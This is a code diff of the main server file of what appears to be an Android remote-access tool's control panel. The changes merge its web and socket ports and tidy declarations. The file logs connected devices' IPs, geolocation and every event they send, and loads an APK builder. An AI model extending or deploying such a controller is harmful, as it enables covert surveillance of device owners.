@@ -4,27 +4,32 @@
 *   By t.me/efxtv
 */
 
-
-const
-    express = require('express'),
-    app = express(),
-    IO = require('socket.io'),
-    geoip = require('geoip-lite'),
-    CONST = require('./includes/const'),
-    db = require('./includes/databaseGateway'),
-    logManager = require('./includes/logManager'),
-    clientManager = new (require('./includes/clientManager'))(db),
-    apkBuilder = require('./includes/apkBuilder');
+const express = require('express');
+const app = express();
+const IO = require('socket.io');
+const geoip = require('geoip-lite');
+const CONST = require('./includes/const');
+const db = require('./includes/databaseGateway');
+const logManager = require('./includes/logManager');
+const ClientManager = require('./includes/clientManager');
+const apkBuilder = require('./includes/apkBuilder');
 
 global.CONST = CONST;
 global.db = db;
 global.logManager = logManager;
 global.app = app;
-global.clientManager = clientManager;
+global.clientManager = new ClientManager(db);
 global.apkBuilder = apkBuilder;
 
-// spin up socket server
-let client_io = IO.listen(CONST.control_port);
+// Get the port from environment or CONST.web_port
+const PORT = process.env.PORT || CONST.web_port;
+
+// Spin up socket server on same port
+const server = app.listen(PORT, () => {
+    console.log(`Web & Control server running on port ${PORT}`);
+});
+
+let client_io = IO(server);
 
 client_io.sockets.pingInterval = 30000;
 client_io.on('connection', (socket) => {
@@ -34,7 +39,7 @@ client_io.on('connection', (socket) => {
 
     let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
     let clientGeo = geoip.lookup(clientIP);
-    if (!clientGeo) clientGeo = {}
+    if (!clientGeo) clientGeo = {};
 
     clientManager.clientConnect(socket, clientParams.id, {
         clientIP,
@@ -50,9 +55,9 @@ client_io.on('connection', (socket) => {
         var onevent = socket.onevent;
         socket.onevent = function (packet) {
             var args = packet.data || [];
-            onevent.call(this, packet);    // original call
+            onevent.call(this, packet); // original call
             packet.data = ["*"].concat(args);
-            onevent.call(this, packet);      // additional call to catch-all
+            onevent.call(this, packet); // additional call to catch-all
         };
 
         socket.on("*", function (event, data) {
@@ -60,18 +65,7 @@ client_io.on('connection', (socket) => {
             console.log(data);
         });
     }
-
 });
-
-
-// get the admin interface online
-app.listen(CONST.web_port);
-
-/* 
-*   
-*   
-*   t.me/efxtv
-*/
 
 app.set('view engine', 'ejs');
 app.set('views', './assets/views');
